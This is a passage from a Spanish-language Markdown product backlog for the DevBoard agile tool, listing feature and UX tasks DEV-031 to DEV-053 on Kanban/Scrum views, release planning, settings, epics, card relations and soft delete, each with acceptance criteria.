- [x] #3 Validar existencia del proyecto: aplicar fallback seguro al primer proyecto disponible si el ID guardado fue eliminado o no existe
- [x] #4 Sincronizar el campo `activeProjectId` en `data/projects-registry.json` a través del endpoint de selección de proyectos
- [x] #5 Garantizar que los componentes de navegación (Header, Kanban, Sprint, Releases) rendericen directamente con el proyecto restaurado sin parpadeos

---

#### [DEV-031] Vistas de Flujo de Trabajo: Alternar entre Kanban Global y Sprint/Release Board Acotado
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

DevBoard debe responder de forma flexible a los dos paradigmas de trabajo ágil más extendidos:
1. **Kanban Puro (Flujo Continuo):** Visualiza todo el backlog del proyecto activo a lo largo de las columnas, permitiendo gestionar el flujo constante de trabajo continuo sin cortes artificiales.
2. **Scrum / Kanban Acotado:** Cuando el equipo trabaja enfocado en un objetivo acotado (Sprint) o en un paquete de entrega (Release), el tablero Kanban debe restringirse exclusivamente a las tareas comprometidas para ese objetivo.

Actualmente, el componente Kanban renderiza indiscriminadamente todas las tareas del proyecto y la pestaña "Sprint & Priorización" se limita a una lista vertical plana.
Esta tarea introduce la capacidad de alternar el alcance del tablero Kanban entre la visión global del proyecto y un tablero acotado al Sprint o Release seleccionado, incorporando indicadores de progreso hacia el objetivo del ciclo.

**Criterios de Aceptación:**
- [x] #1 Incorporar selector de alcance de flujo en el Kanban: opción "Todo el Backlog" (Kanban continuo) y "Sprint / Release Objetivo" (Scrum)
- [x] #2 Permitir seleccionar qué Sprint o Milestone activo visualizar en el modo acotado mediante un selector desplegable
- [x] #3 Filtrar las tarjetas del tablero para mostrar exclusivamente las tareas que coincidan con el `milestone` o `targetSprint` seleccionado
- [x] #4 Mostrar un banner de resumen del ciclo con título del Sprint/Release, contador de tareas completadas y barra de progreso porcentual
- [x] #5 Permitir añadir tareas al sprint activo directamente desde el selector o arrastre sin perder el contexto del proyecto
- [x] #6 Persistir el modo de alcance y el último sprint seleccionado en `localStorage`

---

#### [DEV-032] Planificación de Releases con Target Dinámico y Personalizable
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

En la gestión ágil de producto, los releases no deben funcionar únicamente como un historial estático o un empaquetador automático de tareas que ya alcanzaron el estado `ready`. Los equipos necesitan planificar sus entregas con anticipación, proyectando objetivos y monitoreando el avance hacia ellos.
Esta tarea introduce la figura de **Planned Releases** con target editable:
1. Capacidad de crear y configurar un Release en estado de planificación (ej: versión target `0.3.0`, fecha objetivo y resumen de alcance).
2. Vinculación de tareas planificadas a dicho release a través del campo `milestone`.
3. Dashboard visual de seguimiento en `ReleasesView.tsx` mostrando el porcentaje de cumplimiento del target, tareas en progreso y riesgos detectados.
4. Flexibilidad para actualizar y reprogramar el target a medida que el ciclo de desarrollo evoluciona (modificar fecha estimada, ajustar alcance o transferir tareas).
5. Transición fluida a publicación y empaquetado formal cuando se alcance el 100% de los criterios del release.

**Criterios de Aceptación:**
- [x] #1 Extender el modelo de datos `Release` para incluir estado (`planned` vs `released`), fecha target (`targetDate`) y alcance proyectado
- [x] #2 Incorporar formulario / modal para crear y editar Releases Planificados con versión target, fecha límite y descripción
- [x] #3 Mostrar en `ReleasesView.tsx` una sección destacada de 'Releases en Planificación' con medidor de avance hacia el target (% de tareas completadas)
- [x] #4 Permitir actualizar dinámicamente la fecha y atributos del target desde la interfaz gráfica
- [x] #5 Permitir asociar o desvincular tareas del release target directamente desde la vista de releases o desde `ItemModal`
- [x] #6 Persistir los releases en `backlog/releases.json` manteniendo retrocompatibilidad con las herramientas MCP y scripts de auditoría

---

#### [DEV-033] Refactorización Conceptual y UX: Desacople Sprint/Release, Rediseño ItemModal y Ergonomía de Vistas
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Refactorización profunda de conceptos de dominio, navegación y experiencia de usuario:
- Separación tajante entre Sprint (ciclo de trabajo iterativo) y Release (etiqueta o hito de despliegue a producción).
- Rediseño de ItemModal a layout de dos columnas estilo Linear (contenido principal a la izquierda, metadatos y contexto a la derecha).
- Limpieza radical del selector de proyectos (retirar exportaciones e importaciones) y centralizarlas en Configuración.
- Disminuir el protagonismo del Archivo a un botón sutil en el Header.
- Configuración de vistas activas y vista por defecto persistente.
- Ordenamiento y ergonomía de visualización en la vista de Sprints & Backlog.

**Criterios de Aceptación:**
- [x] #1 Desacoplar semánticamente Sprint vs Release/Versión en datos y UI, eliminando prefijo 'target'
- [x] #2 Rediseñar ItemModal a layout ergonómico de 2 columnas estilo Linear con panel 'Detalles y Contexto' a la derecha
- [x] #3 Limpiar menú de proyectos y reubicar Importación/Exportación en Settings -> Datos y Herramientas
- [x] #4 Reubicar Archivo como acción secundaria sutil con icono en el Header en lugar de pestaña principal
- [x] #5 Añadir selector de vista por defecto y habilitación de vistas en Settings (.devboard/config.json)
- [x] #6 Ordenar semántica y cronológicamente los grupos en SprintView con reasignación ágil

---

#### [DEV-034] Reubicación del Selector de Columnas (Simple/Ampliada) al Contenedor del Tablero Kanban
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Reubicar el conmutador de modo de columnas ("Simple" vs "Ampliada") desde el Header principal hacia la barra de herramientas interna del contenedor del Tablero Kanban:
- En el Header, este control contamina la navegación global y no tiene sentido fuera del contexto del Tablero Kanban.
- En el contenedor de KanbanBoard, se sitúa de forma contextualmente coherente en la barra superior junto al botón de "+ Mostrar Ideas", logrando una jerarquía visual limpia y ergonómica.

**Criterios de Aceptación:**
- [x] #1 Retirar el conmutador de modo de vista (Simple / Ampliada) de Header.tsx tanto en versión de escritorio como en el menú móvil
- [x] #2 Incorporar el selector de columnas (Simple / Ampliada) en la barra de herramientas superior de KanbanBoard.tsx junto al botón de Mostrar Ideas
- [x] #3 Asegurar respuesta responsiva y diseño visual consistente (tokens de color, bordes, estados activos)
- [x] #4 Validar compilación con `npm run build` y sincronización con `npm run backlog:check`

---

#### [DEV-035] Transformación de Configuración a Vista de Página Completa (SettingsView)
- **Prioridad**: `urgent` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Reemplazar el modal comprimido de configuración (`SettingsModal.tsx`) por una vista de página completa (`SettingsView.tsx`):
- El crecimiento de opciones (vistas por defecto, pestañas del header, límites WIP de columnas, importación/exportación, apariencia, editor de configuración JSON) desbordaba el tamaño de un modal emergente.
- La nueva vista de página completa adopta un patrón maestro-detalle estándar de herramientas de clase mundial (Linear / GitHub Settings): sidebar lateral de categorías, panel amplio de configuración, botón de retorno ágil al tablero y barra de guardado con atajo ⌘S.

**Criterios de Aceptación:**
- [x] #1 Crear componente SettingsView.tsx con layout maestro-detalle (sidebar lateral de categorías + panel amplio de contenido)
- [x] #2 Migrar e integrar todas las secciones: Flujo & Vistas, Tablero Kanban, Apariencia, Datos & Herramientas, y Avanzado (JSON)
- [x] #3 Integrar navegación a Settings en App.tsx como pestaña/vista completa ('settings') con botón de retorno al Tablero
- [x] #4 Actualizar el botón de Settings en Header.tsx para alternar la vista completa y reflejar estado activo
- [x] #5 Validar compilación con `npm run build` y sincronización con `npm run backlog:check`

---

#### [DEV-036] Ergonomía Integral: Creación de Sprints, Navegación Home en Logo, Edición Inline de Columnas y Estabilidad de Botón Ideas
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Refinamientos críticos de usabilidad y feedback de producto:
1. Vista Sprint & Priorización: Agregar botón '+ Nuevo Sprint' con sugerencia automática de nombre y soporte de grupo vacío receptor para arrastrar tarjetas.
2. Navegación Header: Hacer que el logo de DevBoard conduzca al Home / Tablero principal al hacer clic.
3. Tablero Kanban: Habilitar la edición de títulos de columnas directamente desde la cabecera del tablero (edición inline con persistencia automática).
4. Toolbar del Tablero: Estabilizar el botón de Ideas para que permanezca accesible y coherente sin desaparecer ni provocar saltos de layout entre modos.

**Criterios de Aceptación:**
- [x] #1 El logo de DevBoard en el Header conduce a la vista principal (Tablero o defaultView) con cursor pointer y hover feedback
- [x] #2 Incorporar botón '+ Nuevo Sprint' en SprintView que permita definir una nueva iteración y muestre drop zone receptora aunque no tenga tarjetas iniciales
- [x] #3 Habilitar edición inline de títulos de columna en KanbanBoard directamente desde cada cabecera con persistencia automática
- [x] #4 Mantener estable y visible el control de Ideas en la toolbar de KanbanBoard sin saltos entre modos Simple y Ampliada
- [x] #5 Validar con `npm run build` y sincronizar con `npm run backlog:check`

---

#### [DEV-037] Reasignación Dinámica y Visual de Estados a Columnas Kanban (Modo Simple y Ampliado)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Permitir a los usuarios y equipos reasignar qué estados del ciclo de vida de una tarea pertenecen a cada columna del tablero Kanban:
1. Vista Simple por Defecto: Mapear `ready` y `finish` a la columna `Done` en `SIMPLIFIED_BASE_COLUMNS` (dejando In Progress con `doing`, `in_progress`, `review`, `testing_qa`).
2. Configuración Visual en Settings: En la sección 'Tablero Kanban' de Ajustes, permitir agregar y remover estados en cada columna interactivamente (chips con botón 'x' y selector '+ Estado') y elegir el dropTargetStatus.
3. Soporte Dual Simple/Ampliada: Permitir personalizar las columnas tanto de la vista Simple (`simplifiedColumns`) como de la vista Ampliada (`columns`).

**Criterios de Aceptación:**
- [x] #1 En la vista simple por defecto, el estado 'ready' (y 'finish') mapea a la columna 'Done' (col-done)
- [x] #2 En SettingsView pestaña 'Tablero Kanban', permitir reasignar estados a cada columna mediante badges interactivos (remover y agregar estados disponibles)
- [x] #3 Soportar edición de dropTargetStatus por columna para definir el estado destino al arrastrar tarjetas
- [x] #4 Soportar personalización y persistencia de columnas tanto para modo Simple como Ampliado en .devboard/config.json
- [x] #5 Validar con `npm run build` y sincronizar con `npm run backlog:check`

---

#### [DEV-038] Soporte de Metodología de Proyecto (Kanban vs Scrum) en Settings para Liberar la Interfaz
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Diferenciación conceptual y visual estricta entre metodologías de proyecto (Kanban Continuo, Scrum Puro y Scrumban Híbrido), con ajuste de vistas por defecto y libertad de personalización manual para el usuario:
1. **Scrum Puro**:
   - Por definición, el tablero de flujo continuo es Kanban. En Scrum Puro NO hay vista de tablero por defecto (`enabledTabs.kanban = false`, `defaultView = 'sprint'`).
   - El centro de operaciones es la vista de Sprints & Priorización / Backlog.
   - El logo de DevBoard y navegación redirigen a 'Sprint & Priorización'.
2. **Scrumban (Híbrido)**:
   - Fusión de Scrum y Kanban: El Tablero es **únicamente del Sprint Goal / Sprint Activo** en curso (no de todo el backlog).
   - Identificación visual clara: `Sprint Board (Scrumban)` con selector de Sprint Goal, progreso de la iteración y empty state si el sprint no tiene tareas.
   - La priorización y grooming general se realiza en 'Sprint & Priorización'.
3. **Kanban Continuo**:
   - Tablero continuo de todo el backlog sin iteraciones.
   - Oculta pestaña de Sprints y campos de Sprint en cards.
4. **Personalización Manual**:
   - El usuario puede cambiar la metodología y luego conmutar manualmente cualquier pestaña (`enabledTabs`) según su preferencia.

**Criterios de Aceptación:**
- [x] #1 En Scrum Puro, deshabilitar la vista Tablero por defecto y establecer 'Sprint & Priorización' como vista principal
- [x] #2 En Scrumban, el Tablero debe ser exclusivamente del Sprint Goal / Sprint Activo, sin conmutador de 'Todo el Backlog'
- [x] #3 En Kanban Continuo, el Tablero muestra todo el backlog sin referencias a sprints y oculta la pestaña de Sprints
- [x] #4 En SettingsView, permitir seleccionar la metodología aplicando presets inteligentes pero permitiendo al usuario activar/desactivar pestañas manualmente
- [x] #5 En Header, navegación móvil y redirección inicial, sincronizar la visibilidad de pestañas y destino del logo según la configuración
- [x] #6 Validar tipado y build con `npm run build` y auditar visualmente con subagente de navegador

---

#### [DEV-040] Arquitectura Autocontenida (Embedded-First) y Configuración Local en .devboard/
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Desacoplar la configuración de DevBoard del registro central global (data/projects-registry.json), permitiendo que toda la configuración de columnas, metodología, vistas y preferencias viva autocontenida en .devboard/config.json dentro del repositorio del proyecto.

**Criterios de Aceptación:**
- [x] #1 Almacenar configuraciones de vista, columnas y metodología en .devboard/config.json dentro del repositorio del proyecto
- [x] #2 Priorizar lectura y escritura de configuración local sobre el registro central data/projects-registry.json
- [x] #3 Garantizar que al clonar el repositorio en otra máquina o entorno, DevBoard cargue la configuración de .devboard/config.json sin pasos manuales
- [x] #4 Mantener compatibilidad hacia atrás con proyectos existentes y proyectos con múltiples carpetas

---

#### [DEV-041] Simplificación de UX/UI en Modo Proyecto Único (Eliminación de Ruido Multi-Proyecto)
- **Prioridad**: `high` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.4.0

Simplificar radicalmente la navegación y la cabecera cuando DevBoard se ejecuta en un repositorio único, eliminando el ruido de selectores de proyectos globales, modales de importación y cambio de repositorios, ofreciendo una experiencia enfocada y limpia similar a Storybook o Prisma Studio.

**Criterios de Aceptación:**
- [x] #1 Detectar modo monoproyecto (Single-Project Mode) cuando devboard se ejecuta apuntando a un único repositorio local
- [x] #2 Ocultar selector desplegable de proyectos en la cabecera cuando se ejecuta en modo monoproyecto
- [x] #3 Ocultar botones y modales de 'Añadir Proyecto' e 'Importar Proyecto' en la navegación principal en modo monoproyecto
- [x] #4 Mostrar en la cabecera el nombre del repositorio activo con un indicador sutil de estado local
- [x] #5 Reservar la interfaz multi-proyecto completa para cuando se invoque explícitamente con flag --hub o --multi

---

#### [DEV-042] Empaquetado y DX como devDependency (Cero Fricción con npm i -D y npx)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Optimizar la experiencia de desarrollador (DX) y empaquetado para que DevBoard pueda ser consumido limpiamente como devDependency en cualquier proyecto Node/TypeScript, levantando el cockpit local y el servidor MCP con cero fricción.

**Criterios de Aceptación:**
- [x] #1 Habilitar instalación local mediante npm i -D devboard (o package runner) con script de inicio 'devboard'
- [x] #2 Soporte para comando rápido de inicialización 'npx devboard --init' que prepare .devboard/ y carpetas base si no existen
- [x] #3 Configuración automática o asistida de scripts en package.json del proyecto anfitrión (ej: "board": "devboard")
- [x] #4 Verificar funcionamiento como devDependency aislada sin interferir con dependencias de React/Vite del proyecto anfitrión

---

#### [DEV-043] Evolutivo de Marca e Identidad: Cockpit Ágil Multidisciplinario (Naming Simple y Disponibilidad)
- **Prioridad**: `medium` | **Tipo**: `feature`

Evolucionar la identidad y el nombre del proyecto y de la aplicación hacia una plataforma integral de gestión ágil para equipos multidisciplinarios (producto, diseño, arquitectura, Scrum Masters y desarrolladores) y agentes de IA:
1. Trascender la denominación "dev-board" hacia un nombre simple, distintivo, con personalidad y agradable al oído, lejos de clichés corporativos o compuestos que terminen en "Board" o "App".
2. Validar disponibilidad en npm/npx y repositorios públicos (GitHub) para asegurar un namespace limpio y ejecutable sin fricción.
3. Planificar una estrategia de migración no destructiva con soporte de binarios duales/alias en `package.json` para garantizar que `npx devboard` siga funcionando mientras se adopta el nuevo comando.
4. Actualizar identidad visual mínima (isotipo, favicon, splash y playbooks de colaboración).

**Criterios de Aceptación:**
- [x] #1 Realizar relevamiento y matriz de disponibilidad pública en npm/npx y GitHub de nombres candidatos con personalidad
- [x] #2 Definir el nombre definitivo del producto y aplicación alineado con la visión de cockpit ágil para todo el equipo
- [x] #3 Configurar soporte de alias/binarios duales en package.json (retrocompatibilidad con npx devboard y adopción del nuevo comando)
- [x] #4 Actualizar referencias de marca en documentación técnica (README.md, AGENTS.md, docs/)

---

#### [DEV-044] Fix: Persistencia de Prioridad P0 en Backlog Markdown y Dirty Checking en Edición de Campos
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.3.0

Corrección de dos problemas críticos de sincronización y persistencia en la vista de Backlog:
1. **Fix de Prioridad P0 (Causa Raíz):** En `scripts/backlogMdParser.ts`, la función `formatPriorityForMd(p)` mapeaba `p === 'p0'` a `'high'`. Al re-parsear el Markdown, `'high'` era normalizado de vuelta a `'p1'`. Por esta razón, cuando el usuario seleccionaba P0 en el dropdown de prioridad, se mostraba el mensaje de éxito pero el valor se revertía inmediatamente a P1 en disco y en la interfaz. Corregir el mapeo a `'urgent'` o `'critical'` tanto en `formatPriorityForMd` como en el parser.
2. **Dirty Checking en Edición de Campos:** Al editar valores en celdas, nombres de columna o dropdowns con autoguardado, verificar si el nuevo valor difiere del preexistente (`newValue !== oldValue`). Si el valor es idéntico, abortar la llamada a la API y no emitir eventos redundantes.

**Criterios de Aceptación:**
- [x] #1 En scripts/backlogMdParser.ts, formatPriorityForMd('p0') serializa a 'urgent' o 'critical' y parseBacklogMd normaliza a 'p0'
- [x] #2 Al cambiar la prioridad a P0 desde el selector en la vista de Backlog, el valor persiste en disco sin revertirse a P1 tras refrescar
- [x] #3 Implementar dirty checking estricto en edición rápida de celdas y nombres de columnas (abortar si el valor no cambia)
- [x] #4 Añadir tests unitarios en scripts/test-parser.js verificando ida y vuelta de todas las prioridades (p0, p1, p2, p3)

---

#### [DEV-045] Estabilidad Visual del Botón de Ideas (Cero CLS) y Estado Destino por Defecto a 'Ready' en Vista Simplificada
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Mejora de estabilidad visual y coherencia del ciclo de vida en el tablero Kanban:
1. **Prevención de Layout Shift (CLS) en Botón de Ideas:** En `KanbanBoard.tsx`, el botón de alternar visibilidad de ideas cambiaba de texto dinámicamente (`Ideas Visibles` vs `+ Mostrar Ideas`), lo que alteraba su ancho intrínseco y desplazaba horizontalmente los botones adyacentes de selector de vista (`simplificada` / `ampliada`). El botón debe mantener un ancho o etiqueta fija (ej. icono con texto "Ideas" y dot/badge de estado) para que la barra de controles permanezca perfectamente estática al interactuar.
2. **Estado al Soltar por Defecto en Vista Simplificada:** En `SIMPLIFIED_BASE_COLUMNS`, el `dropTargetStatus` de la columna `Done` debe ser `ready` en lugar de `done`. El paso formal a `done` depende de la liberación o release del software, no únicamente de finalizar la etapa de desarrollo/QA.

**Criterios de Aceptación:**
- [x] #1 Mantener ancho fijo o etiqueta invariable en el botón de toggle de ideas para garantizar cero Cumulative Layout Shift (CLS)
- [x] #2 Los botones adyacentes de vista simplificada/ampliada no experimentan ningún desplazamiento al conmutar la visibilidad de ideas
- [x] #3 En SIMPLIFIED_BASE_COLUMNS, configurar dropTargetStatus: 'ready' en la columna Done (col-done)
- [x] #4 Al arrastrar una tarjeta a la columna Done en vista simplificada, su estado se actualiza a 'ready' por defecto

---

#### [DEV-046] Renombrar Agrupador 'Sin Sprint' a 'Backlog' y Guardado Condicional al Mover Tarjetas entre Agrupadores
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Ajustes conceptuales y de eficiencia en la vista de Sprints y Priorización:
1. **Renombrar a 'Backlog':** El contenedor de tareas no asignadas a ninguna iteración debe llamarse **"Backlog"** (en lugar de "Sin Sprint" o "Sin Asignar"), alineándose con los estándares metodológicos ágiles y Scrum.
2. **Guardado Condicional Estricto (Dirty Check en D&D):** Al arrastrar y soltar una tarjeta dentro de un sprint o dentro del contenedor Backlog, comprobar previamente si el valor de asignación de la tarjeta cambió (`item.sprint !== targetSprintVal`). Si la tarjeta se suelta dentro de su mismo contenedor actual, no disparar mutaciones a la API ni alterar los archivos Markdown en disco.
3. **Posicionamiento:** El contenedor "Backlog" debe situarse siempre como el último bloque en la vista agrupada de Sprints.

**Criterios de Aceptación:**
- [x] #1 En SprintView.tsx, renombrar el grupo de tarjetas no asignadas a 'Backlog' con icono representativo
- [x] #2 Al soltar una tarjeta en un contenedor, comprobar si el sprint destino es idéntico al actual y abortar la mutación si no hay cambios
- [x] #3 Asegurar que el contenedor Backlog se ubica de forma consistente como el último agrupador en la vista
- [x] #4 En los selectores rápidos de la tabla de SprintView, la opción vacía muestra 'Backlog' en lugar de 'Sin Sprint'

---

#### [DEV-047] Soporte Jerárquico de Alcance Mayor: Épicas e Iniciativas con Agrupación y Progreso Consolidado
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Incorporación de entidades de gestión de alto nivel (Épicas e Iniciativas) para estructurar y agrupar tarjetas con un alcance o visión estratégica mayor:
1. **Tipos de Alto Nivel:** Extender `ItemType` para soportar `'epic'` e `'initiative'`, otorgándoles representación visual distinguida (badges con colores e iconos propios).
2. **Cálculo de Progreso Consolidado (Rollup Metrics):** Cada Épica o Iniciativa calcula dinámicamente el progreso de completitud (% completado, conteo de items cerrados vs abiertos) según el estado de las tareas hijas que la componen.
3. **Vistas Agrupadas y Filtros:** Permitir agrupar la vista de Backlog por Épica o filtrar el tablero Kanban por una Épica seleccionada.
4. **Almacenamiento Compatible:** Las Épicas e Iniciativas se almacenan como archivos `.md` estándar en `backlog/tasks/` manteniendo compatibilidad Backlog.md (`type: epic`, `type: initiative`).

**Criterios de Aceptación:**
- [x] #1 Extender ItemType y esquemas con 'epic' e 'initiative' con estilo visual propio (icono, bordes y badges)
- [x] #2 Las cards de tipo épica/iniciativa muestran barra de progreso porcentual consolidada según sus tareas hijas
- [x] #3 Permitir agrupar la vista Backlog por Épica en el selector 'Agrupar por'
- [x] #4 En FilterBar, añadir selector para filtrar todo el tablero por Épica/Iniciativa
- [x] #5 Sincronización bidireccional limpia con frontmatter Markdown (type: epic, type: initiative)

---

#### [DEV-048] Grafo de Relaciones entre Cards: Jerarquías Verticales (Padre/Hijo Estricto 1-a-N) y Enlaces Horizontales (Bloquea/Depende/Relacionado)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Modelado completo de relaciones entre tarjetas tanto a nivel vertical como horizontal:
1. **Jerarquías Verticales (Padre / Hijo Estricto):** Un ítem solo puede tener un único padre (`parentId` / `parent`), pero un padre puede tener múltiples tareas hijas. Permite asociar cualquier tarea a una Épica o Historia contenedora.
2. **Relaciones Horizontales entre Vecinos / Hermanos:** Soporte para enlaces cruzados entre tarjetas del backlog:
   - `blocks` / `blocked_by`: Card A bloquea a Card B (y recíprocamente Card B está bloqueada por Card A).
   - `related_to`: Tareas relacionadas conceptualmente sin dependencia dura.
   - `depends_on`: Dependencia funcional.
3. **Indicadores de Bloqueo Visual:** Si una tarea tiene dependencias no resueltas (tareas bloqueantes en `doing`, `draft` o `review`), mostrar un badge visual de advertencia roja ("Bloqueada por DEV-XXX") en la tarjeta Kanban y en el detalle.
4. **Persistencia Frontmatter:** Almacenamiento directo en frontmatter Markdown (`parent: 'DEV-010'`, `blocks: ['DEV-020']`, `dependencies: ['DEV-015']`).

**Criterios de Aceptación:**
- [x] #1 Un ítem solo puede tener asignado un único padre (parentId), con selector modal interactivo
- [x] #2 Soporte de relaciones horizontales bidireccionales automáticas (blocks <-> blocked_by, related_to)
- [x] #3 Badge indicador en tarjetas Kanban que señala dependencias bloqueadas y advertencias de precedencia
- [x] #4 En ItemModal, sección interactiva 'Relaciones y Dependencias' para vincular y desvincular ítems
- [x] #5 Persistencia transparente en frontmatter Markdown sin pérdida de datos en hot-reload

---

#### [DEV-049] Ciclo de Vida Seguro: Papelera (Soft Delete), Doble Confirmación de Purga y Protección contra Borrado en 'Done'
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.4.0

Mecanismos de protección anti-destructiva y gestión segura del ciclo de vida de tarjetas:
1. **Protección contra Borrado en 'Done':** Las tareas en estado `done` constituyen el registro histórico y la justificación técnica de cambios en el código. Se bloquea terminantemente su eliminación física o accidental directa desde la interfaz (botón de borrar deshabilitado con tooltip explicativo).
2. **Flujo de Papelera (Soft Delete):** Al eliminar una tarea activa (no-done), el sistema no borra el archivo físico de disco de inmediato; realiza un Soft Delete asignándole `status: 'dismissed'`, `isDeleted: true` y `deletedAt: ISOString`, moviéndola a la sección o pestaña "Papelera".
3. **Restauración y Purga Definitiva con Doble Confirmación:** Dentro de la Papelera:
   - Los ítems pueden ser restaurados a su estado previo en 1 click ("Restaurar ítem").
   - La eliminación física y purgado de disco requiere un modal de doble confirmación con advertencia de seguridad explícita ("Escribe CONFIRMAR para eliminar irreversiblemente").

**Criterios de Aceptación:**
- [x] #1 Deshabilitar el botón de eliminación en tarjetas con estado 'done' con tooltip de protección histórica
- [x] #2 La acción de eliminar tarjetas activas ejecuta un Soft Delete enviándolas a la Papelera con metadato deletedAt
- [x] #3 Vista o filtro de Papelera accesible para consultar y restaurar tarjetas descartadas
- [x] #4 La purga física definitiva de una tarjeta desde la papelera exige un modal de doble confirmación de seguridad
- [x] #5 Integración con scripts/backlogMdParser.ts para preservar o archivar el archivo de forma resiliente

---

#### [DEV-050] Reordenamiento Drag & Drop en Backlog / Sprint y Priorización con Setting de Ranking Manual Condicional
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Soporte integral para reordenamiento manual de ítems en la vista de Backlog y Sprint & Priorización:
1. **Drag & Drop en Backlog:** Permitir arrastrar y soltar verticalmente filas de la tabla de Backlog para priorizarlas interactivamente, al igual que se hace entre columnas del tablero Kanban.
2. **Ranking Manual Condicional (Setting de Proyecto):** Incorporar en Settings el interruptor `rankingEnabled` (Habilitar Ranking Manual):
   - **Cuando está ACTIVADO:** El usuario puede reubicar libremente las filas mediante drag & drop, persistiendo el orden manual (`order` / `ranking`).
   - **Cuando está DESACTIVADO:** Se bloquea el reordenamiento manual; la tabla respeta estrictamente el orden predefinido (ej. por prioridad descendente o por fecha) y oculta los controles de arrastre para evitar alteraciones accidentales.
3. **Persistencia en Frontmatter:** El valor numérico de ranking se conserva en frontmatter Markdown (`order: 10`, `order: 20`, espaciado para reordenamiento sin colisiones).

**Criterios de Aceptación:**
- [x] #1 Soporte de Drag & Drop vertical fluido para reordenar filas en la tabla de Backlog y contenedores de sprint
- [x] #2 Setting 'rankingEnabled' en SettingsView para activar o desactivar el ranking manual
- [x] #3 Cuando el ranking está desactivado, el arrastre manual queda bloqueado y se respeta el orden estricto de columnas
- [x] #4 Al reordenar filas con ranking activo, se actualiza el campo 'order' y se persiste en los archivos Markdown
- [x] #5 Rendimiento optimizado a 60 FPS durante la interacción de arrastre en listas largas

---

#### [DEV-051] Configuración y Parametrización de Columnas Visibles en la Vista de Backlog
- **Prioridad**: `low` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.4.0

Permitir a los usuarios personalizar qué columnas de información se muestran en la tabla de la vista de Backlog:
1. **Selector de Columnas:** Añadir un menú desplegable/popover "Columnas" en la barra superior de la vista de Backlog con checkboxes para activar u ocultar campos.
2. **Campos Parametrizables:** Posibilidad de alternar:
   - Columnas base: Prioridad, Código, Título, Estado, Tipo.
   - Columnas opcionales: Módulo, Archivo Impactado, Épica/Padre, Dependencias, Release/Versión, Sprints, Fecha de Creación.
3. **Persistencia Local:** Guardar las preferencias de columnas visibles en la configuración local del proyecto (`.devboard/config.json`) para que se mantengan entre sesiones y recargas.
4. **Ergonomía:** Asegurar layout elástico sin scrolls horizontales rotos al alternar columnas.

**Criterios de Aceptación:**
- [x] #1 Popover interactivo 'Columnas' en la barra de herramientas de la vista Backlog
- [x] #2 Capacidad de conmutar visibilidad de columnas opcionales (módulo, parent, release, dependencias, etc.)
- [x] #3 Las columnas obligatorias (código, título) permanecen ancladas para preservar usabilidad mínima
- [x] #4 Persistencia de las columnas activas en .devboard/config.json
- [x] #5 La tabla adapta su distribución de anchos de celda de forma fluida sin romper el layout

---

#### [DEV-052] Zonas de Soltado Multi-Estado (Drop Targets Específicos) en Columnas Kanban Agrupadas
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.4.0

Resolución del problema de asignación de estados cuando una columna Kanban agrupa más de un estado:
1. **Limitación Actual:** Actualmente, si una columna agrupa varios estados (por ejemplo, la columna In Progress agrupa `doing`, `in_progress`, `review`, `testing_qa`), al soltar una tarjeta se le asigna de forma fija el `dropTargetStatus` por defecto de la columna, lo cual es solo un fallback insuficiente y no cubre todos los casos de uso reales.
2. **Subzonas de Soltado Dinámicas:** Cuando el usuario arrastra una tarjeta sobre una columna que tiene múltiples estados asignados (`statuses.length > 1`), la interfaz debe desplegar bloques o zonas de soltado (drop zones) claramente diferenciadas para cada uno de los estados mapeados (ej: bloque para `doing`, bloque para `review`, etc.).
3. **Selección Directa y Fallback:**
   - Si el usuario suelta la tarjeta dentro de una subzona específica, la tarjeta asume inmediatamente ese estado exacto.
   - Si el usuario suelta en el cuerpo general de la columna fuera de las subzonas, se utiliza el `dropTargetStatus` como fallback seguro.

**Criterios de Aceptación:**
- [x] #1 Detectar columnas Kanban con más de un estado mapeado (statuses.length > 1)
- [x] #2 Al sobrevolar la columna con una tarjeta arrastrada, desplegar subzonas de drop claramente delimitadas con el nombre de cada estado
- [x] #3 Soltar sobre una subzona específica transiciona la tarjeta a ese estado exacto
- [x] #4 Soltar en la zona neutra de la columna aplica dropTargetStatus como fallback
- [x] #5 Animación fluida de apertura de subzonas sin provocar jank ni saltos bruscos en el scroll

---

#### [DEV-053] Configuración Visual de Tablero por Drag & Drop en Settings (Arrastre de Estados entre Columnas)
- **Prioridad**: `low` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.4.0

Evolución de la experiencia de usuario en la configuración del tablero en `SettingsView`:
1. **Experiencia Actual:** La asignación de estados a columnas se realiza mediante badges estáticos y selectores desplegables '+ Estado'.
2. **Experiencia por Drag & Drop:** Permitir que los badges de estado sean arrastrables (`draggable`) entre las tarjetas de columnas. El usuario puede tomar un estado (ej. `review`) de una columna y arrastrarlo visualmente hacia otra (ej. de "In Progress" a una columna "Testing"), reasignándolo instantáneamente de manera intuitiva.
3. **Soporte Dual:** Funcionamiento tanto en la pestaña de configuración del Modo Simple (3 columnas) como del Modo Ampliado (5 columnas).
